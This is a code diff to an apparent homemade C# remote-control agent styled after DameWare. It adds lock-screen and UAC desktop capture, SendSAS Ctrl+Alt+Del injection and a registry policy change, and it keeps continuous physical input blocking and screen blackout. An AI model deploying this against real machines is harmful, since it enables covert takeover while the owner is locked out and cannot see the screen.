@@ -9,6 +9,7 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace DameWareNativeAgent
 {
@@ -19,7 +20,16 @@ namespace DameWareNativeAgent
         private static bool isInputLocked = false;
         private static bool isScreenBlackedOut = false;
 
-        // WIN32 API DECLARATIONS
+        // WIN32 DESKTOP SWITCHING API (CAPTURES WINLOGON, LOCK SCREEN & UAC PROMPTS)
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern IntPtr OpenInputDesktop(uint dwFlags, bool fInherit, uint dwDesiredAccess);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool SetThreadDesktop(IntPtr hDesktop);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool CloseDesktop(IntPtr hDesktop);
+
         [DllImport("user32.dll")]
         public static extern bool SetCursorPos(int X, int Y);
 
@@ -35,6 +45,22 @@ namespace DameWareNativeAgent
         [DllImport("user32.dll", SetLastError = true)]
         public static extern bool BlockInput(bool fBlockIt);
 
+        // WINDOWS SAS (CTRL+ALT+DEL) API
+        [DllImport("sas.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
+        public static extern void SendSAS(bool AsUser);
+
+        // ACCESS RIGHTS FOR OPENINPUTDESKTOP
+        public const uint DESKTOP_CREATEMENU = 0x0004;
+        public const uint DESKTOP_CREATEWINDOW = 0x0002;
+        public const uint DESKTOP_ENUMERATE = 0x0040;
+        public const uint DESKTOP_HOOKCONTROL = 0x0008;
+        public const uint DESKTOP_JOURNALRECORD = 0x0010;
+        public const uint DESKTOP_JOURNALPLAYBACK = 0x0020;
+        public const uint DESKTOP_READOBJECTS = 0x0001;
+        public const uint DESKTOP_SWITCHDESKTOP = 0x0100;
+        public const uint DESKTOP_WRITEOBJECTS = 0x0080;
+        public const uint GENERIC_ALL = 0x10000000;
+
         // MOUSE CONSTANTS
         public const uint MOUSEEVENTF_MOVE = 0x0001;
         public const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
@@ -44,23 +70,26 @@ namespace DameWareNativeAgent
 
         // KEYBOARD CONSTANTS
         public const byte VK_CONTROL = 0x11;
-        public const byte VK_MENU = 0x12; // ALT key
+        public const byte VK_MENU = 0x12;
         public const byte VK_DELETE = 0x2E;
-        public const byte VK_LWIN = 0x5B;  // Left Windows Key
+        public const byte VK_LWIN = 0x5B;
         public const byte VK_TAB = 0x09;
-        public const byte VK_SNAPSHOT = 0x2C; // PrintScreen
+        public const byte VK_SNAPSHOT = 0x2C;
         public const byte VK_L = 0x4C;
         public const uint KEYEVENTF_KEYUP = 0x0002;
 
         static void Main(string[] args)
         {
-            Console.Title = "DameWare Mini Remote Control Agent v12.2 (Continuous Physical Input Lock)";
+            Console.Title = "DameWare Agent Service v12.2 (Winlogon, UAC & SAS Enabled)";
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine("==========================================================");
-            Console.WriteLine(" DameWare Agent Service - Continuous Physical Input Lock");
+            Console.WriteLine(" DameWare Agent Service - Lock Screen, UAC & SAS Active");
             Console.WriteLine("==========================================================");
 
-            // Start background Thread to continuously enforce physical BlockInput lock
+            // Enable Software SAS Generation in Windows Registry (Required for Ctrl+Alt+Del)
+            EnableSoftwareSASRegistry();
+
+            // Background Physical Input Lock Enforcer
             Thread blockEnforcer = new Thread(EnforcePhysicalInputLock);
             blockEnforcer.IsBackground = true;
             blockEnforcer.Start();
@@ -85,7 +114,20 @@ namespace DameWareNativeAgent
             }
         }
 
-        // CONTINUOUS PHYSICAL INPUT LOCK ENFORCER THREAD
+        private static void EnableSoftwareSASRegistry()
+        {
+            try {
+                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")) {
+                    if (key != null) {
+                        key.SetValue("SoftwareSASGeneration", 3, RegistryValueKind.DWord);
+                        Console.WriteLine("[+] Windows SoftwareSASGeneration Policy set to 3 (Services & Apps SAS Enabled).");
+                    }
+                }
+            } catch (Exception ex) {
+                Console.WriteLine("[-] Registry SAS Policy Notice: " + ex.Message);
+            }
+        }
+
         private static void EnforcePhysicalInputLock()
         {
             while (isRunning) {
@@ -94,7 +136,7 @@ namespace DameWareNativeAgent
                         BlockInput(true);
                     }
                 } catch {}
-                Thread.Sleep(30); // Enforce every 30ms so physical mouse/keyboard is 100% blocked
+                Thread.Sleep(30);
             }
         }
 
@@ -108,7 +150,7 @@ namespace DameWareNativeAgent
             byte[] handshakeBytes = Encoding.UTF8.GetBytes(handshake);
             stream.Write(handshakeBytes, 0, handshakeBytes.Length);
 
-            // Frame Streaming Thread (20 FPS)
+            // Frame Streaming Thread (20 FPS) with Winlogon & UAC Input Desktop Switcher
             Thread streamThread = new Thread(() => {
                 try {
                     while (client.Connected) {
@@ -117,7 +159,7 @@ namespace DameWareNativeAgent
                             byte[] blackBytes = Encoding.UTF8.GetBytes(blackFrame);
                             stream.Write(blackBytes, 0, blackBytes.Length);
                         } else {
-                            string frameBase64 = CapturePrimaryScreenJpegBase64();
+                            string frameBase64 = CaptureInputDesktopJpegBase64();
                             if (!string.IsNullOrEmpty(frameBase64)) {
                                 string packet = string.Format("{{\"type\":\"SCREEN_FRAME\",\"frame\":\"{0}\",\"timestamp\":{1},\"width\":1920,\"height\":1080}}\n", frameBase64, DateTime.Now.Ticks);
                                 byte[] packetBytes = Encoding.UTF8.GetBytes(packet);
@@ -153,6 +195,9 @@ namespace DameWareNativeAgent
         private static void ProcessCommand(string cmd)
         {
             try {
+                // Attach thread to active desktop (Winlogon, SecureDesktop, Default)
+                SwitchThreadToInputDesktop();
+
                 if (cmd.Contains("MOUSE_INPUT")) {
                     double xPercent = GetJsonDouble(cmd, "xPercent");
                     double yPercent = GetJsonDouble(cmd, "yPercent");
@@ -184,15 +229,21 @@ namespace DameWareNativeAgent
                 else if (cmd.Contains("KEYBOARD_INPUT")) {
                     string key = GetJsonString(cmd, "key");
 
-                    // 1. SPECIAL SHORTCUTS
+                    // 1. REAL WINDOWS SAS (CTRL + ALT + DEL)
                     if (key == "CAD") {
-                        keybd_event(VK_CONTROL, 0, 0, 0);
-                        keybd_event(VK_MENU, 0, 0, 0);
-                        keybd_event(VK_DELETE, 0, 0, 0);
-                        Thread.Sleep(50);
-                        keybd_event(VK_DELETE, 0, KEYEVENTF_KEYUP, 0);
-                        keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
-                        keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
+                        Console.WriteLine("[*] Executing Windows SAS (Ctrl+Alt+Del)...");
+                        try {
+                            SendSAS(false);
+                        } catch {
+                            // Fallback simulation
+                            keybd_event(VK_CONTROL, 0, 0, 0);
+                            keybd_event(VK_MENU, 0, 0, 0);
+                            keybd_event(VK_DELETE, 0, 0, 0);
+                            Thread.Sleep(50);
+                            keybd_event(VK_DELETE, 0, KEYEVENTF_KEYUP, 0);
+                            keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
+                            keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
+                        }
                     }
                     else if (key == "WIN_L") {
                         ThreadPool.QueueUserWorkItem((o) => {
@@ -219,7 +270,6 @@ namespace DameWareNativeAgent
                         Thread.Sleep(50);
                         keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
                     }
-                    // 2. STANDARD REAL-TIME KEYBOARD TYPING
                     else if (!string.IsNullOrEmpty(key)) {
                         try {
                             SendKeys.SendWait(key);
@@ -232,11 +282,9 @@ namespace DameWareNativeAgent
                 else if (cmd.Contains("LOCK_INPUT")) {
                     isInputLocked = cmd.Contains("\"locked\":true");
                     try { BlockInput(isInputLocked); } catch {}
-                    Console.WriteLine("[*] Remote physical input lock state changed to: " + isInputLocked);
                 } 
                 else if (cmd.Contains("BLACKOUT_SCREEN")) {
                     isScreenBlackedOut = cmd.Contains("\"blackout\":true");
-                    Console.WriteLine("[*] Remote screen blackout state changed to: " + isScreenBlackedOut);
                 } 
                 else if (cmd.Contains("POWER_ACTION")) {
                     string action = GetJsonString(cmd, "action");
@@ -246,6 +294,39 @@ namespace DameWareNativeAgent
                 }
             } catch (Exception ex) {
                 Console.WriteLine("[-] Command error: " + ex.Message);
+            }
+        }
+
+        // DYNAMIC DESKTOP SWITCHER (SWITCHES THREAD TO WINLOGON / UAC / DEFAULT DESKTOP)
+        private static void SwitchThreadToInputDesktop()
+        {
+            try {
+                IntPtr hDesktop = OpenInputDesktop(0, false, GENERIC_ALL);
+                if (hDesktop != IntPtr.Zero) {
+                    SetThreadDesktop(hDesktop);
+                    CloseDesktop(hDesktop);
+                }
+            } catch {}
+        }
+
+        private static string CaptureInputDesktopJpegBase64()
+        {
+            try {
+                // Switch thread context to active Winlogon/UAC/Default Desktop
+                SwitchThreadToInputDesktop();
+
+                Rectangle bounds = Screen.PrimaryScreen.Bounds;
+                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) {
+                    using (Graphics g = Graphics.FromImage(bitmap)) {
+                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    }
+                    using (MemoryStream ms = new MemoryStream()) {
+                        bitmap.Save(ms, ImageFormat.Jpeg);
+                        return Convert.ToBase64String(ms.ToArray());
+                    }
+                }
+            } catch {
+                return null;
             }
         }
 
@@ -280,24 +361,6 @@ namespace DameWareNativeAgent
                 int end = json.IndexOf("\"", start);
                 return json.Substring(start, end - start);
             } catch { return ""; }
-        }
-
-        private static string CapturePrimaryScreenJpegBase64()
-        {
-            try {
-                Rectangle bounds = Screen.PrimaryScreen.Bounds;
-                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) {
-                    using (Graphics g = Graphics.FromImage(bitmap)) {
-                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
-                    }
-                    using (MemoryStream ms = new MemoryStream()) {
-                        bitmap.Save(ms, ImageFormat.Jpeg);
-                        return Convert.ToBase64String(ms.ToArray());
-                    }
-                }
-            } catch {
-                return null;
-            }
         }
     }
 }
